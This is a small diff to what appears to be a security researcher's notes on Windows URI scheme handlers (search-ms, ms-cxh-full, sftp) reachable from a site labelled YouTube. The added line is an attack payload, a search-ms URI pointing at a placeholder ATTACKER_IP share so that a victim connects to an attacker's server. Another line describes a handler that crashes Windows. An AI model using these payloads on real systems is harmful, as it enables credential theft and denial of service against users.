@@ -18,6 +18,7 @@ Site: "YouTube"
 `search-ms://` -> Opens Windows Explorer
 `ms-cxh-full://` -> Fucks Windows (DOS if excuted blackscreen will appear and wont go until restart)
 `sftp://` -> sftp idk about what this shoit can do but definitely smth good
+`search-ms://?crumb=location:\\ATTACKER_IP\SHARE` -> make victim connect to attacker server
 
 ---
 ## Full Page Content
